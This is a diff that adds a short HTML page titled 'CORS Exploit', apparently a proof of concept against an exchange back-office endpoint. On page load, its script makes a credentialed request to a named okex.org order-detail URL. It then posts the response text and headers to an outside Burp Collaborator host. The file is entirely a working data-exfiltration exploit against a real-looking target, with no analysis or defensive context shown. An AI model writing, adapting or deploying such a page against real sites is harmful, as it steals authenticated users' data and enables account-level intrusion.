@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Exploit</title>
+</head>
+<body>
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                // Send the response and headers to Burp Collaborator
+                fetch('https://rc7kqjj796bi0gmum2qny5cu0l6cu8qwf.oastify.com', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        url: 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297',
+                        responseText: xhr.responseText,
+                        headers: xhr.getAllResponseHeaders()
+                    })
+                });
+            }
+        };
+        xhr.open('GET', 'https://csboss.okex.org/newboss/otc/open/detail/175497622/52633297', true);
+        xhr.withCredentials = true; // Include cookies in the request if needed
+        xhr.send();
+    </script>
+</body>
+</html>
